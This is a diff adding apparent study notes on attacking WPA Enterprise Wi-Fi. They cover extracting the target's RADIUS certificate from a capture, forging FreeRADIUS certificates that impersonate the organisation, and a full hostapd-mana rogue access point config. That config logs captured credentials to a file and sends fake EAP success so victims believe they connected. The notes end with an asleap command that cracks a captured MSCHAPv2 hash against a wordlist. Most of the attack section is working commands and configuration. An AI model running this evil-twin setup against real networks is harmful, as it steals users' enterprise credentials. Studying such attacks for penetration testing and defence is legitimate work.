@@ -1,4 +1,156 @@
 # Chapter 7 - WPA Enterprise
+
+## My Notes
+
+
+
+## Certificates
+
+```
+sudo airodump-ng wlan0mon
+
+We have to open the capture file with _Wireshark_ and locate the server certificate frame.  
+
+tls.handshake.certificate
+
+which will show the exact frames where the certificate is given.
+
+--------
+
+1) In the **Packet Details** pane 
+2) open _Extensible Authentication Protocol
+3) _Transport Layer Security_
+4) Open the **TLSv1 Record Layer: Handshake Protocol: Certificate** 
+5) Expand **Handshake Protocol: Certificate** item
+6) then **Certificates** (plural). 
+7) Inside **Certificates**, we see one or more entries named **Certificate**
+8) For each certificate, we right click and select _Export Packet Bytes_ to save the data into a file with a .der extension.
+9) openssl x509 -inform der -in CERTIFICATE_FILENAME -text 
+	1) where **CERTIFICATE_FILENAME** is the path to the certificate.
+10) We can convert it to PEM format using 
+	1) openssl x509 -inform der -in CERTIFICATE_FILENAME -outform pem -out OUTPUT_PEM.crt
+
+
+
+```
+## Attack
+
+```
+
+sudo apt install freeradius
+
+sudo -s
+cd /etc/freeradius/3.0/certs
+nano ca.cnf
+
+...
+[certificate_authority]
+countryName             = US
+stateOrProvinceName     = CA
+localityName            = San Francisco
+organizationName        = Playtronics
+emailAddress            = ca@playtronics.com
+commonName              = "Playtronics Certificate Authority"
+...
+
+nano server.cnf
+
+...
+[server]
+countryName             = US
+stateOrProvinceName     = CA
+localityName            = San Francisco
+organizationName        = Playtronics
+emailAddress            = admin@playtronics.com
+commonName              = "Playtronics"
+...
+
+rm dh
+make
+
+sudo hostapd-mana /etc/hostapd-mana/mana.conf
+
+...
+# SSID of the AP
+ssid=Playtronics
+
+# Network interface to use and driver type
+# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
+interface=wlan0
+driver=nl80211
+
+# Channel and mode
+# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
+channel=1
+# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
+hw_mode=g
+
+# Setting up hostapd as an EAP server
+ieee8021x=1
+eap_server=1
+
+# Key workaround for Win XP
+eapol_key_index_workaround=0
+
+# EAP user file we created earlier
+eap_user_file=/etc/hostapd-mana/mana.eap_user
+
+# Certificate paths created earlier
+ca_cert=/etc/freeradius/3.0/certs/ca.pem
+server_cert=/etc/freeradius/3.0/certs/server.pem
+private_key=/etc/freeradius/3.0/certs/server.key
+# The password is actually 'whatever'
+private_key_passwd=whatever
+dh_file=/etc/freeradius/3.0/certs/dh
+
+# Open authentication
+auth_algs=1
+# WPA/WPA2
+wpa=3
+# WPA Enterprise
+wpa_key_mgmt=WPA-EAP
+# Allow CCMP and TKIP
+# Note: iOS warns when network has TKIP (or WEP)
+wpa_pairwise=CCMP TKIP
+
+# Enable Mana WPE
+mana_wpe=1
+
+# Store credentials in that file
+mana_credout=/tmp/hostapd.credout
+
+# Send EAP success, so the client thinks it's connected
+mana_eapsuccess=1
+
+# EAP TLS MitM
+mana_eaptls=1
+
+...
+
+We'll now need to create the EAP user file referenced in the configuration file:
+
+/etc/hostapd-mana/mana.eap_user
+
+The file should contain the following:
+...
+
+*     PEAP,TTLS,TLS,FAST
+"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+
+...
+
+```
+
+## Crack Password
+```
+asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
+
+
+
+```
+
+--------------
+## Other Notes
 ### WPA enterprise
 Each user uses his own user and password (if client certificates are not used). Each user's traffic is encrypted with a different key. Connection in windows:
 
